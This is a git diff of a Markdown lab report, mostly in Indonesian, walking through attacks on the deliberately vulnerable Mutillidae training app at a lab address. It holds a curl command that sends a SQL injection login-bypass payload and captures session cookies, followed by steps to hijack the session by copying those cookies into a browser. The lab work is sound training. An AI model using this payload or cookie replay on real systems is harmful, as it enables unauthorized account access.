@@ -99,10 +99,10 @@ cat crack_cookies.txt
    - cd /root
    - Jalankan perintah berikut:
 ```bash
-   grep -i cookie burp2.txt
+ grep -i cookie burp2.txt
 ```
 ```bash
-   grep -i username burp2.txt
+grep -i username burp2.txt
 ```
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/4/run_command.png "Home page")
 
@@ -110,54 +110,64 @@ Simulate cURL SQL Injection: (Obtain Access #2)
 1. Use Curl to Login with POST Data
    - Buka terminal, ketikkan perintah-perintah berikut : 
 ```bash 
-	rm crack_cookies.txt
+rm crack_cookies.txt
 ```
 ```bash
-	curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
+curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
 ``` 
 ```bash
-	grep "Logged In" login2.txt
+grep "Logged In" login2.txt
 ```
 ```bash
-	cat crack_cookies.txt
+cat crack_cookies.txt
 ```
    - Session cookies akan disimpan pada file crack_cookies.txt
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 
 ## Restore Firefox Original Proxy Configurations
 1. View Preferences
    - Klik toggle menu yang ada di pojok kanan atas
    - Pilih Preferences
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 2. Advanced Settings
    - Pilih menu Advanced
    - Pilih Network Tabs
    - Klik Setting
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 3. Connection Settings
    - Pilih no proxy
    - Klik Ok, Kemudian Close
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 
 ## Simulate Man-In-The-Middle Attack
 1. Start Cookies Manager+
    - Pilih tab Tools > Cookies Manager+ > Klik Cookies Manager+
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 2. Add Cookie Entry
    - Klik New Cookie
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 3. Add PHPSESSID Cookie Entry
    - Name: PHPSESSID
    - Content: sesuai yang ada pada text crack_cookies.txt
    - Host: 10.0.1.100
    - Path: /
    - Klik tombol Save
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 4. Add username Cookie Entry
    - Name: username
    - Content: samurai
    - Host: 10.0.1.100
    - Path: /mutillidae/
    - Klik tombol Save
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 5. Add uid Cookie Entry
    - Name: uid
    - Content: 6
    - Host: 10.0.1.100
    - Path: /mutillidae/
    - Klik tombol Save
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
 6. Verifikasi Result
    - Buka halaman http://10.0.1.100/mutillidae/index.php
    - Jika berhasil, anda akan login sebagai samurai
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/3/result_obtain_1.png "Home page")
